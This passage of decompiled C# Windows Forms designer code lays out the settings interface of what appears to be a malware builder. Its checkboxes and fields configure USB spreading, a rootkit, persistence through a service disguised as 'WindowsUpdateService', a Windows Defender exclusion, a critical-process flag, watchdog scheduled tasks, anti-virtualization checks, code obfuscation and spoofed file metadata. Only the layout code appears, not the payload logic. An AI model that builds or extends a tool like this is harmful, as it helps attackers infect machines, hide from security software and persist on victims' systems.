		this.rjTextBoxWMIStartup.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBoxWMIStartup.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBoxWMIStartup.Location = new System.Drawing.Point(301, 42);
		this.rjTextBoxWMIStartup.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxWMIStartup.Multiline = false;
		this.rjTextBoxWMIStartup.Name = "rjTextBoxWMIStartup";
		this.rjTextBoxWMIStartup.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBoxWMIStartup.PasswordChar = false;
		this.rjTextBoxWMIStartup.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxWMIStartup.PlaceholderText = "Service Name (WindowsUpdateService)";
		this.rjTextBoxWMIStartup.Size = new System.Drawing.Size(170, 31);
		this.rjTextBoxWMIStartup.TabIndex = 39;
		this.rjTextBoxWMIStartup.Texts = "";
		this.rjTextBoxWMIStartup.UnderlinedStyle = false;
		this.checkBoxUSBSpread.AutoSize = true;
		this.checkBoxUSBSpread.Location = new System.Drawing.Point(303, 82);
		this.checkBoxUSBSpread.Name = "checkBoxUSBSpread";
		this.checkBoxUSBSpread.Size = new System.Drawing.Size(85, 17);
		this.checkBoxUSBSpread.TabIndex = 40;
		this.checkBoxUSBSpread.Text = "USB Spread";
		this.checkBoxUSBSpread.UseVisualStyleBackColor = true;
		this.checkBoxUSBSpread.CheckedChanged += new System.EventHandler(checkBoxUSBSpread_CheckedChanged);
		this.rjTextBoxUSBSpread.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBoxUSBSpread.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBoxUSBSpread.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxUSBSpread.BorderRadius = 0;
		this.rjTextBoxUSBSpread.BorderSize = 1;
		this.rjTextBoxUSBSpread.Enabled = false;
		this.rjTextBoxUSBSpread.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBoxUSBSpread.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBoxUSBSpread.Location = new System.Drawing.Point(301, 106);
		this.rjTextBoxUSBSpread.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxUSBSpread.Multiline = false;
		this.rjTextBoxUSBSpread.Name = "rjTextBoxUSBSpread";
		this.rjTextBoxUSBSpread.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBoxUSBSpread.PasswordChar = false;
		this.rjTextBoxUSBSpread.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxUSBSpread.PlaceholderText = "USB File Name (readme.txt)";
		this.rjTextBoxUSBSpread.Size = new System.Drawing.Size(170, 31);
		this.rjTextBoxUSBSpread.TabIndex = 41;
		this.rjTextBoxUSBSpread.Texts = "";
		this.rjTextBoxUSBSpread.UnderlinedStyle = false;
		this.checkBoxWindowsService.AutoSize = true;
		this.checkBoxWindowsService.Location = new System.Drawing.Point(113, 7);
		this.checkBoxWindowsService.Name = "checkBoxWindowsService";
		this.checkBoxWindowsService.Size = new System.Drawing.Size(109, 17);
		this.checkBoxWindowsService.TabIndex = 44;
		this.checkBoxWindowsService.Text = "Windows Service";
		this.checkBoxWindowsService.UseVisualStyleBackColor = true;
		this.checkBoxWindowsService.CheckedChanged += new System.EventHandler(checkBoxWindowsService_CheckedChanged);
		this.rjTextBoxWindowsService.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBoxWindowsService.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBoxWindowsService.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxWindowsService.BorderRadius = 0;
		this.rjTextBoxWindowsService.BorderSize = 1;
		this.rjTextBoxWindowsService.Enabled = false;
		this.rjTextBoxWindowsService.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBoxWindowsService.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBoxWindowsService.Location = new System.Drawing.Point(113, 31);
		this.rjTextBoxWindowsService.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxWindowsService.Multiline = false;
		this.rjTextBoxWindowsService.Name = "rjTextBoxWindowsService";
		this.rjTextBoxWindowsService.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBoxWindowsService.PasswordChar = false;
		this.rjTextBoxWindowsService.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxWindowsService.PlaceholderText = "Service Name";
		this.rjTextBoxWindowsService.Size = new System.Drawing.Size(180, 31);
		this.rjTextBoxWindowsService.TabIndex = 45;
		this.rjTextBoxWindowsService.Texts = "";
		this.rjTextBoxWindowsService.UnderlinedStyle = false;
		this.checkBoxProcessCritical.AutoSize = true;
		this.checkBoxProcessCritical.Location = new System.Drawing.Point(479, 27);
		this.checkBoxProcessCritical.Name = "checkBoxProcessCritical";
		this.checkBoxProcessCritical.Size = new System.Drawing.Size(98, 17);
		this.checkBoxProcessCritical.TabIndex = 34;
		this.checkBoxProcessCritical.Text = "Process Critical";
		this.checkBoxProcessCritical.UseVisualStyleBackColor = true;
		this.checkBoxProcessCritical.CheckedChanged += new System.EventHandler(checkBoxProcessCritical_CheckedChanged);
		this.rjTextBoxProcessCritical.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBoxProcessCritical.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBoxProcessCritical.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxProcessCritical.BorderRadius = 0;
		this.rjTextBoxProcessCritical.BorderSize = 1;
		this.rjTextBoxProcessCritical.Enabled = false;
		this.rjTextBoxProcessCritical.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBoxProcessCritical.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBoxProcessCritical.Location = new System.Drawing.Point(479, 51);
		this.rjTextBoxProcessCritical.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxProcessCritical.Multiline = false;
		this.rjTextBoxProcessCritical.Name = "rjTextBoxProcessCritical";
		this.rjTextBoxProcessCritical.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBoxProcessCritical.PasswordChar = false;
		this.rjTextBoxProcessCritical.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxProcessCritical.PlaceholderText = "Process name";
		this.rjTextBoxProcessCritical.Size = new System.Drawing.Size(300, 31);
		this.rjTextBoxProcessCritical.TabIndex = 35;
		this.rjTextBoxProcessCritical.Texts = "";
		this.rjTextBoxProcessCritical.UnderlinedStyle = false;
		this.checkBoxCmdlineAutorun.Location = new System.Drawing.Point(97, 71);
		this.checkBoxCmdlineAutorun.Name = "checkBoxCmdlineAutorun";
		this.checkBoxCmdlineAutorun.Size = new System.Drawing.Size(103, 17);
		this.checkBoxCmdlineAutorun.TabIndex = 30;
		this.checkBoxCmdlineAutorun.Text = "Cmdline Autorun";
		this.checkBoxCmdlineAutorun.UseVisualStyleBackColor = true;
		this.checkBoxCmdlineAutorun.CheckedChanged += new System.EventHandler(checkBoxCmdlineAutorun_CheckedChanged);
		this.rjComboBoxCmdlineDir.BackColor = System.Drawing.Color.White;
		this.rjComboBoxCmdlineDir.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBoxCmdlineDir.BorderSize = 1;
		this.rjComboBoxCmdlineDir.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBoxCmdlineDir.Enabled = false;
		this.rjComboBoxCmdlineDir.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBoxCmdlineDir.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBoxCmdlineDir.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBoxCmdlineDir.Items.AddRange(new object[25]
		{
			"%Windows%", "%System32%", "%SysWOW64%", "%ProgramFiles%", "%ProgramFiles(x86)%", "%ProgramData%", "%AppData%", "%LocalAppData%", "%Temp%", "%UserProfile%",
			"%Public%", "%CommonProgramFiles%", "%CommonProgramFiles(x86)%", "%SystemRoot%", "%WinDir%", "%HomeDrive%", "%SystemDrive%", "C:\\Windows\\System32", "C:\\Windows\\SysWOW64", "C:\\Program Files",
			"C:\\Program Files (x86)", "C:\\ProgramData", "C:\\Users\\Public", "C:\\Temp", "C:\\Windows\\Temp"
		});
		this.rjComboBoxCmdlineDir.ListBackColor = System.Drawing.Color.White;
		this.rjComboBoxCmdlineDir.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBoxCmdlineDir.Location = new System.Drawing.Point(97, 94);
		this.rjComboBoxCmdlineDir.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBoxCmdlineDir.Name = "rjComboBoxCmdlineDir";
		this.rjComboBoxCmdlineDir.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBoxCmdlineDir.Size = new System.Drawing.Size(200, 30);
		this.rjComboBoxCmdlineDir.TabIndex = 31;
		this.rjComboBoxCmdlineDir.Texts = "%Windows%";
		this.rjTextBoxCmdlineProcess.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBoxCmdlineProcess.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBoxCmdlineProcess.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxCmdlineProcess.BorderRadius = 0;
		this.rjTextBoxCmdlineProcess.BorderSize = 1;
		this.rjTextBoxCmdlineProcess.Enabled = false;
		this.rjTextBoxCmdlineProcess.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBoxCmdlineProcess.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBoxCmdlineProcess.Location = new System.Drawing.Point(97, 130);
		this.rjTextBoxCmdlineProcess.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxCmdlineProcess.Multiline = false;
		this.rjTextBoxCmdlineProcess.Name = "rjTextBoxCmdlineProcess";
		this.rjTextBoxCmdlineProcess.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBoxCmdlineProcess.PasswordChar = false;
		this.rjTextBoxCmdlineProcess.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxCmdlineProcess.PlaceholderText = "Autorun process name (cmd.exe)";
		this.rjTextBoxCmdlineProcess.Size = new System.Drawing.Size(200, 31);
		this.rjTextBoxCmdlineProcess.TabIndex = 29;
		this.rjTextBoxCmdlineProcess.Texts = "";
		this.rjTextBoxCmdlineProcess.UnderlinedStyle = false;
		this.checkBox7.AutoSize = true;
		this.checkBox7.Location = new System.Drawing.Point(12, 143);
		this.checkBox7.Name = "checkBox7";
		this.checkBox7.Size = new System.Drawing.Size(65, 17);
		this.checkBox7.TabIndex = 28;
		this.checkBox7.Text = "User Init";
		this.checkBox7.UseVisualStyleBackColor = true;
		this.checkBox9.AutoSize = true;
		this.checkBox9.Location = new System.Drawing.Point(12, 120);
		this.checkBox9.Name = "checkBox9";
		this.checkBox9.Size = new System.Drawing.Size(53, 17);
		this.checkBox9.TabIndex = 27;
		this.checkBox9.Text = "Pump";
		this.checkBox9.UseVisualStyleBackColor = true;
		this.checkBox8.AutoSize = true;
		this.checkBox8.Location = new System.Drawing.Point(12, 51);
		this.checkBox8.Name = "checkBox8";
		this.checkBox8.Size = new System.Drawing.Size(93, 17);
		this.checkBox8.TabIndex = 26;
		this.checkBox8.Text = "Exclusion WD";
		this.checkBox8.UseVisualStyleBackColor = true;
		this.rjTextBox5.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox5.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox5.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox5.BorderRadius = 0;
		this.rjTextBox5.BorderSize = 1;
		this.rjTextBox5.Enabled = false;
		this.rjTextBox5.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox5.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox5.Location = new System.Drawing.Point(479, 130);
		this.rjTextBox5.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox5.Multiline = false;
		this.rjTextBox5.Name = "rjTextBox5";
		this.rjTextBox5.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox5.PasswordChar = false;
		this.rjTextBox5.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox5.PlaceholderText = "Task for start 30 minutes WatchDog";
		this.rjTextBox5.Size = new System.Drawing.Size(300, 31);
		this.rjTextBox5.TabIndex = 24;
		this.rjTextBox5.Texts = "";
		this.rjTextBox5.UnderlinedStyle = false;
		this.checkBox6.AutoSize = true;
		this.checkBox6.Location = new System.Drawing.Point(12, 74);
		this.checkBox6.Name = "checkBox6";
		this.checkBox6.Size = new System.Drawing.Size(79, 17);
		this.checkBox6.TabIndex = 22;
		this.checkBox6.Text = "Hidden File";
		this.checkBox6.UseVisualStyleBackColor = true;
		this.rjComboBox2.BackColor = System.Drawing.Color.White;
		this.rjComboBox2.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox2.BorderSize = 1;
		this.rjComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox2.Enabled = false;
		this.rjComboBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox2.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox2.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox2.Items.AddRange(new object[12]
		{
			"%ApplicationData%", "%Windows%", "%UserProfile%", "%ProgramFiles%", "%Templates%", "%LocalApplicationData%", "%CommonDocuments%", "%MyDocuments%", "%MyMusic%", "%MyVideos%",
			"%Cookies%", "%CommonPictures%"
		});
		this.rjComboBox2.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox2.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox2.Location = new System.Drawing.Point(359, 175);
		this.rjComboBox2.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox2.Name = "rjComboBox2";
		this.rjComboBox2.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox2.Size = new System.Drawing.Size(250, 30);
		this.rjComboBox2.TabIndex = 21;
		this.rjComboBox2.Texts = "";
		this.rjTextBox4.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox4.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox4.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox4.BorderRadius = 0;
		this.rjTextBox4.BorderSize = 1;
		this.rjTextBox4.Enabled = false;
		this.rjTextBox4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox4.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox4.Location = new System.Drawing.Point(359, 212);
		this.rjTextBox4.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox4.Multiline = false;
		this.rjTextBox4.Name = "rjTextBox4";
		this.rjTextBox4.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox4.PasswordChar = false;
		this.rjTextBox4.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox4.PlaceholderText = "Path Watch Dog";
		this.rjTextBox4.Size = new System.Drawing.Size(250, 31);
		this.rjTextBox4.TabIndex = 20;
		this.rjTextBox4.Texts = "";
		this.rjTextBox4.UnderlinedStyle = false;
		this.checkBox5.AutoSize = true;
		this.checkBox5.Location = new System.Drawing.Point(359, 144);
		this.checkBox5.Name = "checkBox5";
		this.checkBox5.Size = new System.Drawing.Size(81, 17);
		this.checkBox5.TabIndex = 19;
		this.checkBox5.Text = "Watch Dog";
		this.checkBox5.UseVisualStyleBackColor = true;
		this.checkBox5.CheckedChanged += new System.EventHandler(checkBox5_CheckedChanged);
		this.rjComboBox1.BackColor = System.Drawing.Color.White;
		this.rjComboBox1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.BorderSize = 1;
		this.rjComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox1.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.Items.AddRange(new object[12]
		{
			"%ApplicationData%", "%Windows%", "%UserProfile%", "%ProgramFiles%", "%Templates%", "%LocalApplicationData%", "%CommonDocuments%", "%MyDocuments%", "%MyMusic%", "%MyVideos%",
			"%Cookies%", "%CommonPictures%"
		});
		this.rjComboBox1.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox1.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.Location = new System.Drawing.Point(12, 175);
		this.rjComboBox1.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox1.Name = "rjComboBox1";
		this.rjComboBox1.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox1.Size = new System.Drawing.Size(250, 30);
		this.rjComboBox1.TabIndex = 18;
		this.rjComboBox1.Texts = "";
		this.rjTextBox3.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox3.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox3.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox3.BorderRadius = 0;
		this.rjTextBox3.BorderSize = 1;
		this.rjTextBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox3.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox3.Location = new System.Drawing.Point(12, 212);
		this.rjTextBox3.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox3.Multiline = false;
		this.rjTextBox3.Name = "rjTextBox3";
		this.rjTextBox3.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox3.PasswordChar = false;
		this.rjTextBox3.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox3.PlaceholderText = "Path Client";
		this.rjTextBox3.Size = new System.Drawing.Size(250, 31);
		this.rjTextBox3.TabIndex = 17;
		this.rjTextBox3.Texts = "";
		this.rjTextBox3.UnderlinedStyle = false;
		this.checkBox4.AutoSize = true;
		this.checkBox4.Location = new System.Drawing.Point(12, 97);
		this.checkBox4.Name = "checkBox4";
		this.checkBox4.Size = new System.Drawing.Size(64, 17);
		this.checkBox4.TabIndex = 16;
		this.checkBox4.Text = "Root Kit";
		this.checkBox4.UseVisualStyleBackColor = true;
		this.checkBox4.CheckedChanged += new System.EventHandler(checkBox4_CheckedChanged);
		this.rjTextBox2.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox2.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox2.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox2.BorderRadius = 0;
		this.rjTextBox2.BorderSize = 1;
		this.rjTextBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox2.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox2.Location = new System.Drawing.Point(479, 91);
		this.rjTextBox2.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox2.Multiline = false;
		this.rjTextBox2.Name = "rjTextBox2";
		this.rjTextBox2.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox2.PasswordChar = false;
		this.rjTextBox2.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox2.PlaceholderText = "Task for start 5 minutes Client";
		this.rjTextBox2.Size = new System.Drawing.Size(300, 31);
		this.rjTextBox2.TabIndex = 14;
		this.rjTextBox2.Texts = "";
		this.rjTextBox2.UnderlinedStyle = false;
		this.checkBox1.AutoSize = true;
		this.checkBox1.Location = new System.Drawing.Point(6, 44);
		this.checkBox1.Name = "checkBox1";
		this.checkBox1.Size = new System.Drawing.Size(53, 17);
		this.checkBox1.TabIndex = 0;
		this.checkBox1.Text = "Install";
		this.checkBox1.UseVisualStyleBackColor = true;
		this.checkBox1.CheckedChanged += new System.EventHandler(checkBox1_CheckedChanged);
		this.tabPage3.Controls.Add(this.checkBox15);
		this.tabPage3.Controls.Add(this.checkBox10);
		this.tabPage3.Controls.Add(this.pictureBox1);
		this.tabPage3.Controls.Add(this.checkBox20);
		this.tabPage3.Controls.Add(this.rjTextBox9);
		this.tabPage3.Controls.Add(this.checkBox2);
		this.tabPage3.Controls.Add(this.checkBox22);
		this.tabPage3.Controls.Add(this.checkBoxAntiVirtual);
		this.tabPage3.Controls.Add(this.checkBoxCtrlFlow);
		this.tabPage3.Controls.Add(this.checkBoxJunk);
		this.tabPage3.Controls.Add(this.checkBoxProxyInt);
		this.tabPage3.Controls.Add(this.checkBoxRename);
		this.tabPage3.Controls.Add(this.checkBoxMixer);
		this.tabPage3.Controls.Add(this.checkBoxProtectInt);
		this.tabPage3.Controls.Add(this.checkBoxProxyString);
		this.tabPage3.Controls.Add(this.panel4);
		this.tabPage3.ImageKey = "file_settings_icon_207200.png";
		this.tabPage3.Location = new System.Drawing.Point(4, 23);
		this.tabPage3.Name = "tabPage3";
		this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage3.Size = new System.Drawing.Size(865, 398);
		this.tabPage3.TabIndex = 2;
		this.tabPage3.Text = "Common";
		this.tabPage3.UseVisualStyleBackColor = true;
		this.pictureBox1.Location = new System.Drawing.Point(380, 87);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(103, 93);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.pictureBox1.TabIndex = 0;
		this.pictureBox1.TabStop = false;
		this.checkBox20.AutoSize = true;
		this.checkBox20.Checked = true;
		this.checkBox20.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBox20.Location = new System.Drawing.Point(380, 213);
		this.checkBox20.Name = "checkBox20";
		this.checkBox20.Size = new System.Drawing.Size(47, 17);
		this.checkBox20.TabIndex = 11;
		this.checkBox20.Text = "Icon";
		this.checkBox20.UseVisualStyleBackColor = true;
		this.rjTextBox9.BackColor = System.Drawing.Color.White;
		this.rjTextBox9.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox9.BorderFocusColor = System.Drawing.Color.Magenta;
		this.rjTextBox9.BorderRadius = 0;
		this.rjTextBox9.BorderSize = 1;
		this.rjTextBox9.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox9.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox9.Location = new System.Drawing.Point(380, 237);
		this.rjTextBox9.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox9.Multiline = false;
		this.rjTextBox9.Name = "rjTextBox9";
		this.rjTextBox9.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox9.PasswordChar = false;
		this.rjTextBox9.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox9.PlaceholderText = "Process Name";
		this.rjTextBox9.Size = new System.Drawing.Size(217, 28);
		this.rjTextBox9.TabIndex = 41;
		this.rjTextBox9.Texts = "";
		this.rjTextBox9.UnderlinedStyle = false;
		this.checkBox2.AutoSize = true;
		this.checkBox2.Location = new System.Drawing.Point(380, 190);
		this.checkBox2.Name = "checkBox2";
		this.checkBox2.Size = new System.Drawing.Size(95, 17);
		this.checkBox2.TabIndex = 21;
		this.checkBox2.Text = "Process Name";
		this.checkBox2.UseVisualStyleBackColor = true;
		this.checkBox22.AutoSize = true;
		this.checkBox22.Checked = true;
		this.checkBox22.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBox22.Location = new System.Drawing.Point(485, 190);
		this.checkBox22.Name = "checkBox22";
		this.checkBox22.Size = new System.Drawing.Size(103, 17);
		this.checkBox22.TabIndex = 11;
		this.checkBox22.Text = "Digital Signature";
		this.checkBox22.UseVisualStyleBackColor = true;
		this.checkBoxAntiVirtual.AutoSize = true;
		this.checkBoxAntiVirtual.Checked = true;
		this.checkBoxAntiVirtual.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBoxAntiVirtual.Location = new System.Drawing.Point(485, 213);
		this.checkBoxAntiVirtual.Name = "checkBoxAntiVirtual";
		this.checkBoxAntiVirtual.Size = new System.Drawing.Size(76, 17);
		this.checkBoxAntiVirtual.TabIndex = 20;
		this.checkBoxAntiVirtual.Text = "Anti Virtual";
		this.checkBoxAntiVirtual.UseVisualStyleBackColor = true;
		this.checkBoxCtrlFlow.AutoSize = true;
		this.checkBoxCtrlFlow.Checked = true;
		this.checkBoxCtrlFlow.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBoxCtrlFlow.Location = new System.Drawing.Point(380, 18);
		this.checkBoxCtrlFlow.Name = "checkBoxCtrlFlow";
		this.checkBoxCtrlFlow.Size = new System.Drawing.Size(66, 17);
		this.checkBoxCtrlFlow.TabIndex = 13;
		this.checkBoxCtrlFlow.Text = "Ctrl Flow";
		this.checkBoxCtrlFlow.UseVisualStyleBackColor = true;
		this.checkBoxJunk.AutoSize = true;
		this.checkBoxJunk.Checked = true;
		this.checkBoxJunk.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBoxJunk.Location = new System.Drawing.Point(460, 18);
		this.checkBoxJunk.Name = "checkBoxJunk";
		this.checkBoxJunk.Size = new System.Drawing.Size(49, 17);
		this.checkBoxJunk.TabIndex = 14;
		this.checkBoxJunk.Text = "Junk";
		this.checkBoxJunk.UseVisualStyleBackColor = true;
		this.checkBoxProxyInt.AutoSize = true;
		this.checkBoxProxyInt.Checked = true;
		this.checkBoxProxyInt.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBoxProxyInt.Location = new System.Drawing.Point(530, 18);
		this.checkBoxProxyInt.Name = "checkBoxProxyInt";
		this.checkBoxProxyInt.Size = new System.Drawing.Size(67, 17);
		this.checkBoxProxyInt.TabIndex = 15;
		this.checkBoxProxyInt.Text = "Proxy Int";
		this.checkBoxProxyInt.UseVisualStyleBackColor = true;
		this.checkBoxRename.AutoSize = true;
		this.checkBoxRename.Checked = true;
		this.checkBoxRename.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBoxRename.Location = new System.Drawing.Point(380, 41);
		this.checkBoxRename.Name = "checkBoxRename";
		this.checkBoxRename.Size = new System.Drawing.Size(66, 17);
		this.checkBoxRename.TabIndex = 16;
		this.checkBoxRename.Text = "Rename";
		this.checkBoxRename.UseVisualStyleBackColor = true;
		this.checkBoxMixer.AutoSize = true;
		this.checkBoxMixer.Checked = true;
		this.checkBoxMixer.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBoxMixer.Location = new System.Drawing.Point(460, 41);
		this.checkBoxMixer.Name = "checkBoxMixer";
		this.checkBoxMixer.Size = new System.Drawing.Size(51, 17);
		this.checkBoxMixer.TabIndex = 17;
		this.checkBoxMixer.Text = "Mixer";
		this.checkBoxMixer.UseVisualStyleBackColor = true;
		this.checkBoxProtectInt.AutoSize = true;
		this.checkBoxProtectInt.Checked = true;
		this.checkBoxProtectInt.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBoxProtectInt.Location = new System.Drawing.Point(530, 41);
		this.checkBoxProtectInt.Name = "checkBoxProtectInt";
		this.checkBoxProtectInt.Size = new System.Drawing.Size(75, 17);
		this.checkBoxProtectInt.TabIndex = 18;
		this.checkBoxProtectInt.Text = "Protect Int";
		this.checkBoxProtectInt.UseVisualStyleBackColor = true;
		this.checkBoxProxyString.AutoSize = true;
		this.checkBoxProxyString.Checked = true;
		this.checkBoxProxyString.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBoxProxyString.Location = new System.Drawing.Point(380, 64);
		this.checkBoxProxyString.Name = "checkBoxProxyString";
		this.checkBoxProxyString.Size = new System.Drawing.Size(82, 17);
		this.checkBoxProxyString.TabIndex = 19;
		this.checkBoxProxyString.Text = "Proxy String";
		this.checkBoxProxyString.UseVisualStyleBackColor = true;
		this.panel4.Controls.Add(this.rjButton3);
		this.panel4.Controls.Add(this.rjButtonGenerateAssembly);
		this.panel4.Controls.Add(this.checkBox21);
		this.panel4.Controls.Add(this.TextBoxFileVersion);
		this.panel4.Controls.Add(this.TextBoxProductVersion);
		this.panel4.Controls.Add(this.TextBoxOriginalFileName);
		this.panel4.Controls.Add(this.TextBoxTrademarks);
		this.panel4.Controls.Add(this.TextBoxCopyright);
		this.panel4.Controls.Add(this.TextBoxCompany);
		this.panel4.Controls.Add(this.TextBoxDescription);
		this.panel4.Controls.Add(this.TextBoxProduct);
